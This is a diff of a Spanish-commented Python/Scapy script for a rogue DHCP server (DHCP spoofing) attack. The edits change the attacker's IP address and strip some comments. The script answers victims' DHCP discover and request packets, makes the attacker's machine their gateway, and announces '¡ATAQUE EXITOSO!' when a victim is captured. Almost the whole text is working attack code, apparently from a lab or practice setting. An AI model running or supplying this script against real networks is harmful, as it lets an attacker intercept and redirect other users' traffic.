@@ -2,10 +2,10 @@
 from scapy.all import *
 import time
 
-# --- CONFIGURACIÓN ---
+
 interface = "eth0"
-my_ip = "10.22.95.4"       # Tu IP (Atacante)
-fake_router = "10.22.95.4" # El Gateway serás TÚ
+my_ip = "10.22.95.12"       # Tu IP 
+fake_router = "10.22.95.12" # El Gateway serás TÚ
 fake_dns = "8.8.8.8"
 offer_ip = "10.22.95.200"  # La IP que le daremos a la víctima
 subnet_mask = "255.255.255.0"
@@ -27,7 +27,7 @@ def handle_dhcp(pkt):
         client_mac = pkt[Ether].src
         xid = pkt[BOOTP].xid
         
-        # 1. Si es DISCOVER -> Enviamos OFFER
+        # Si es DISCOVER -> Enviamos OFFER
         if message_type == 1:
             print(f"[+] DISCOVER recibido de {client_mac}. Enviando OFFER...")
             
@@ -44,7 +44,7 @@ def handle_dhcp(pkt):
                                   "end"])
             sendp(offer, iface=interface, verbose=0)
 
-        # 2. Si es REQUEST -> Enviamos ACK (La parte que faltaba)
+        
         elif message_type == 3:
             requested_ip = get_option(pkt[DHCP].options, 'requested_addr')
             
@@ -56,7 +56,7 @@ def handle_dhcp(pkt):
                       IP(src=my_ip, dst="255.255.255.255") / \
                       UDP(sport=67, dport=68) / \
                       BOOTP(op=2, yiaddr=offer_ip, siaddr=my_ip, chaddr=pkt[BOOTP].chaddr, xid=xid) / \
-                      DHCP(options=[("message-type", "ack"), # <--- ESTO FALTABA
+                      DHCP(options=[("message-type", "ack"), 
                                     ("server_id", my_ip),
                                     ("subnet_mask", subnet_mask),
                                     ("router", fake_router),
@@ -67,4 +67,5 @@ def handle_dhcp(pkt):
                 print(f"[*] ¡ATAQUE EXITOSO! La víctima {client_mac} es nuestra.")
 
 # Filtramos tráfico UDP puerto 67
+
 sniff(filter="udp and port 67", iface=interface, prn=handle_dhcp)
